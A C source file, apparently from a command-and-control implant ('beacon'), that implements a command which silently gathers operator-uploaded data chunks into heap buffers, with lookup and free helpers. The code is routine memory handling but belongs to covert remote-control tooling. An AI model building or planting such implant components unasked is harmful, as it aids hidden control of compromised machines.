/* beacon/src/Commands/MemSave.c
 * CMD_SAVEMEMORY (0x2A) - accumulate upload data chunks in memory.
 *
 * Task args wire format:
 *   memoryId(4LE) + totalSize(4LE) + chunkSize(4LE) + chunk_data
 *
 * First chunk allocates the buffer; subsequent chunks append.
 * CMD_UPLOAD later retrieves the accumulated buffer by memoryId.
 *
 * Result: zero-length, status=OK (silent - no console output). */

#include "Nax.h"

FUNC INT NaxCmdSaveMemory( PNAX_INSTANCE Nax,
                           const PBYTE   args,
                           UINT32        args_len,
                           PBYTE         out,
                           UINT32*       out_len ) {
    if ( !args || args_len < 12 ) return NAX_ERR_INVAL;

    UINT32 memoryId  = NaxR32( args );
    UINT32 totalSize = NaxR32( args + 4 );
    UINT32 chunkSize = NaxR32( args + 8 );
    if ( 12 + chunkSize > args_len ) return NAX_ERR_INVAL;
    PBYTE  chunkData = (PBYTE)args + 12;

    /* Find or create MemSave node */
    NAX_MEMSAVE* ms = Nax->MemSaveHead;
    while ( ms ) {
        if ( ms->MemoryId == memoryId ) break;
        ms = ms->Next;
    }

    if ( !ms ) {
        ms = (NAX_MEMSAVE*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_MEMSAVE ) );
        if ( !ms ) return NAX_ERR_NOMEM;
        ms->Buffer = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, totalSize );
        if ( !ms->Buffer ) {
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, ms );
            return NAX_ERR_NOMEM;
        }
        ms->MemoryId    = memoryId;
        ms->TotalSize   = totalSize;
        ms->CurrentSize = 0;
        ms->Next        = Nax->MemSaveHead;
        Nax->MemSaveHead = ms;
    }

    /* Append chunk data */
    UINT32 space = ms->TotalSize - ms->CurrentSize;
    UINT32 copy_len = ( chunkSize <= space ) ? chunkSize : space;
    if ( copy_len > 0 ) {
        MmCopy( ms->Buffer + ms->CurrentSize, chunkData, copy_len );
        ms->CurrentSize += copy_len;
    }

    *out_len = 0;
    return NAX_OK;
}

/* Retrieve accumulated buffer by memoryId.  Returns NULL if not found. */
FUNC NAX_MEMSAVE* NaxMemSaveGet( PNAX_INSTANCE Nax, UINT32 memoryId ) {
    NAX_MEMSAVE* ms = Nax->MemSaveHead;
    while ( ms ) {
        if ( ms->MemoryId == memoryId ) return ms;
        ms = ms->Next;
    }
    return NULL;
}

/* Free a MemSave node and unlink it from the list. */
FUNC VOID NaxMemSaveFree( PNAX_INSTANCE Nax, UINT32 memoryId ) {
    NAX_MEMSAVE** prev = &Nax->MemSaveHead;
    NAX_MEMSAVE*  ms   = Nax->MemSaveHead;
    while ( ms ) {
        if ( ms->MemoryId == memoryId ) {
            *prev = ms->Next;
            if ( ms->Buffer )
                Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, ms->Buffer );
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, ms );
            return;
        }
        prev = &ms->Next;
        ms   = ms->Next;
    }
}
